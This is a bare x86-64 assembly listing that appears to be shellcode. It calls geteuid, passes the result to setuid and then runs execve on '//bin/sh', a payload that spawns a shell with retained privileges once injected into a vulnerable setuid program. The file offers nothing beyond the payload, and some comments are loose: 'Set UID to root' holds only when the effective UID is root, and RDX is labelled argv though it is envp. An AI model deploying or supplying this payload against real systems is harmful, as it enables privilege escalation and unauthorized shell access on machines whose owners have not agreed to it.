section .text
	global _start

_start:
	xor rax, rax
	mov al, 0x6b			; Syscall number: geteuid
	syscall				; Get the effective current UID

	mov rdi, rax
	mov al, 0x69			; Syscall number: setuid
	syscall				; Set UID to root

	mov al, 0x3b			; Syscall number: execve
	xor rdi, rdi			; Clear RDI
	push rdi
	mov rdi, 0x68732f6e69622f2f	; "/bin/sh" in little-endian
	push rdi			; Push "/bin/sh" onto the stack
	mov rdi, rsp			; RDI points to "/bin/sh"
	xor rsi, rsi			; RSI = NULL (argv)
	xor rdx, rdx			; RDX = NULL (argv)
	syscall				; Invoke execve("/bin/sh", NULL, NULL)
